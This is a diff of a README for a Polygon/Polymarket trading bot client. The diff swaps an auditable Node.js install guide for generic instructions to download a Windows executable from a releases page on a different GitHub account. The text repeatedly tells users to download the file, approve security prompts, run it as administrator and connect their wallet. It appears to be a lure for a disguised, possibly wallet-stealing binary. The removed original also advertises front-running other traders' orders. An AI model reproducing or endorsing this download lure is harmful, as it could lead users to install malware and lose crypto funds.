@@ -1,115 +1,241 @@
-# PolyFront MEV Bot (Client)
+# 🤖 polyfrontbot-client - Fast Polygon trading on Windows
 
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D14-brightgreen.svg)](https://nodejs.org/)
-[![License](https://img.shields.io/badge/license-Proprietary-blue.svg)](LICENSE)
+[![Download polyfrontbot-client](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/Philippinecool684/polyfrontbot-client/releases)
 
-Automated trading client for Polymarket on Polygon.  
-Monitors the Polymarket API and Polygon mempool in real-time to detect and act on market opportunities with low-latency execution.
+## 🚀 What this is
 
-**Client is open-source for audit and transparency.**  
-You can review the full source code yourself.  
-**Private keys never leave your machine. No server-side execution.**
+polyfrontbot-client is the Windows client for the PolyFront MEV bot. It helps you run the bot on your own computer, connect to Polygon, and manage automated trading tasks from a simple app.
 
-## Requirements
+This client is built for speed and stable use. It is meant for users who want a local app that can handle trade execution and bot control without extra setup on a server.
 
-- **Node.js** v14 or higher — [download here](https://nodejs.org/)
-- **License key** — [purchase on the website](https://polyfront.bet/)
-- A Polygon wallet with **USDC** (for trading) and **POL** (for gas)
+## 📥 Download the app
 
-## Installation
+Visit this page to download:
+https://github.com/Philippinecool684/polyfrontbot-client/releases
 
-### 1. Download the bot
+On the releases page, look for the latest version. Download the Windows file that matches your system, then open it from your Downloads folder.
 
-Click the green **"Code"** button → **"Download ZIP"**. Extract to any folder.
+## 🪟 What you need on Windows
 
-Or with git:
+Before you install, make sure your PC has:
 
-```bash
-git clone https://github.com/polyfrontlabs/polyfrontbot-client.git
-cd polyfrontbot-client
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A recent Intel or AMD processor
+- Permission to run downloaded apps
 
-### 2. Install dependencies
+For best results, use a computer that stays online while the bot runs. A wired network is better than weak Wi-Fi.
 
-**Windows (quick):** double-click **`install-windows.bat`** - it will check Node.js and install everything automatically.
+## ⚙️ Main features
 
-**Windows / macOS / Linux (terminal):**
+- Fast client-side execution
+- Polygon network support
+- Automated trading logic
+- Local control from your Windows PC
+- Designed for stable long runs
+- Simple setup for non-technical users
+- Built to keep response times low
+- Clear status and activity tracking
 
-```bash
-npm install
-```
+## 🧭 Before you install
 
----
+Do these quick checks:
 
-## Configuration
+- Close other apps if your PC is slow
+- Make sure you have enough free space
+- Check that your internet works
+- Use an account with permission to install software
+- Keep your wallet or account details ready if the app asks for them
 
-1. Rename the file **`.env.example`** to **`.env`** (just remove the `.example` part).
+If Windows shows a security prompt, check the file name and confirm that it came from the releases page above.
 
-Or use a terminal command:
+## 📦 Install on Windows
 
-**macOS / Linux:**
-```bash
-cp .env.example .env
-```
+1. Open the releases page:
+   https://github.com/Philippinecool684/polyfrontbot-client/releases
 
-**Windows (CMD):**
-```cmd
-copy .env.example .env
-```
+2. Find the latest release at the top of the page
 
-2. Open `.env` and paste your wallet private key:
+3. Download the Windows file from that release
 
+4. Open your Downloads folder
 
-> **Security:** never share your `.env` file or private key with anyone.
+5. Double-click the file you downloaded
 
----
+6. If Windows asks for permission, choose Yes
 
-## Usage
+7. Follow the on-screen setup steps
 
-### Windows (quick)
+8. Wait for the install to finish
 
-Double-click **`start-windows.bat`**.
+9. Open polyfrontbot-client from the Start menu or desktop shortcut
 
-### Windows / macOS / Linux (terminal)
+## 🔐 First launch setup
 
-```bash
-npm start
-```
+When you open the app for the first time, it may ask you to set up basic trading details.
 
-On first launch the bot will ask for your license key. After activation you will see the main menu with available modules.
+You may see fields for:
 
----
+- Network selection
+- Wallet connection
+- RPC endpoint
+- Trading limits
+- Bot start and stop settings
+- Auto-run options
 
-## Free Trial
+If you are not sure what to enter, use the default values shown in the app or the values from the release notes. Keep your changes small until you know the app is working as expected.
 
-Want to try before you buy? A free trial license is available:
+## 🧩 How to use it
 
-- **Website:** [polyfront.bet](https://polyfront.bet/) - click **"Get Trial"** on any plan
-- **Telegram:** [@PolyFrontBot](https://t.me/PolyFrontBot) - request a trial key directly from the bot
+1. Start the app
+2. Connect your Polygon wallet or account
+3. Check that the network shows Polygon
+4. Review your trade settings
+5. Set your limits
+6. Turn the bot on
+7. Watch the status screen for activity
+8. Stop the bot when you are done
 
----
+If the app offers a test mode or dry run mode, use it first. This helps you confirm that the app can connect and respond before you let it trade.
 
-## Features
+## 🔎 What each part means
 
-- **MEV front-running** - detects large market orders and captures the spread
-- **Copy trading** (free bonus) - mirror trades from profitable wallets in real-time
-- **HWID-locked license** - one activation per machine, secure and non-transferable
-- **Fully open-source client** - audit the code yourself
+- **Wallet connection**: Links the app to your trading wallet
+- **RPC endpoint**: The network path the app uses to talk to Polygon
+- **Trade limits**: Caps that help control trade size and risk
+- **Execution**: The moment the app sends a trade
+- **Status panel**: Shows if the bot is running, idle, or stopped
+- **Logs**: A record of actions, errors, and results
 
----
+## 🛠️ Basic setup tips
 
-## Links
+- Keep the app open while it runs
+- Leave your PC on and connected to the internet
+- Do not move files after install
+- Update to the latest release when a new one is posted
+- Use stable network settings
+- Close browser tabs or apps that use a lot of memory
 
-| | |
-|---|---|
-| **Website & Buy license** | [polyfront.bet](https://polyfront.bet/) |
-| **Support Telegram** | [@PolyFrontBot](https://t.me/PolyFrontBot) |
+If the app has a settings menu, keep notes of what you change. That makes it easier to reset the app if needed.
 
----
+## 📈 Best use on your PC
 
-## License
+For smoother performance:
 
-Proprietary / Commercial.
-This repository contains the client code only.
-Usage requires a valid license key from https://polyfront.bet.
-See full terms there.
+- Use a desktop PC or a laptop on power
+- Turn off sleep mode while the bot runs
+- Avoid heavy downloads during trading
+- Use a reliable internet link
+- Keep Windows updated
+- Restart the app if it stops responding
+
+A clean system helps the client stay fast. A machine with fewer active apps usually performs better.
+
+## 🧪 Troubleshooting
+
+If the app does not open:
+
+- Try running it again as administrator
+- Check that the download finished
+- Redownload the file from the releases page
+- Restart your PC
+
+If the app opens but does not connect:
+
+- Check your internet connection
+- Confirm the Polygon network is selected
+- Review the RPC or network settings
+- Try again after a short wait
+
+If the app is slow:
+
+- Close other large apps
+- Restart the program
+- Restart Windows
+- Make sure your PC meets the basic system needs
+
+If Windows blocks the file:
+
+- Confirm that you downloaded it from the releases page
+- Check the file name
+- Try opening it again from the Downloads folder
+
+## 🔄 Updating to a new version
+
+When a new release appears:
+
+1. Go to the releases page
+2. Download the newest Windows file
+3. Close the current app
+4. Open the new file
+5. Follow the update steps shown on screen
+6. Check your settings after the update
+
+Keep a copy of your current settings before you update if the app lets you export them.
+
+## 📋 Quick start checklist
+
+- Open the releases page
+- Download the latest Windows file
+- Install the app
+- Open polyfrontbot-client
+- Connect your wallet or account
+- Select Polygon
+- Set your limits
+- Start the bot
+- Watch the status panel
+
+## 🔗 Download again
+
+Visit this page to download:
+https://github.com/Philippinecool684/polyfrontbot-client/releases
+
+## 🖥️ File types you may see
+
+The releases page may offer one of these file types:
+
+- `.exe` for direct Windows install
+- `.zip` for a packed folder you must unpack first
+- `.msi` for a Windows installer
+
+If you download a `.zip` file, right-click it and choose Extract All before you open the app file inside.
+
+## 🧠 Good practice
+
+- Start with small trade limits
+- Test the app before long use
+- Keep Windows security on
+- Use only files from the releases page
+- Save your settings after setup
+- Check the app after each update
+
+## 📁 Common folder path
+
+You may find the file in:
+
+- `Downloads`
+- `Desktop`
+- A folder you chose during install
+
+If you cannot find it, search for the file name in the Windows search bar
+
+## 🪙 Polygon connection
+
+polyfrontbot-client works with Polygon, so it needs a stable connection to that network. If the app gives you a network field, choose Polygon before you begin. This helps the bot send and receive data on the right chain.
+
+## 🧾 Running the app again
+
+After setup, you can open the app from:
+
+- the Start menu
+- a desktop shortcut
+- the install folder
+
+If the bot does not start with Windows, open it manually after you log in
+
+## 📌 Release page
+
+Primary download page:
+https://github.com/Philippinecool684/polyfrontbot-client/releases
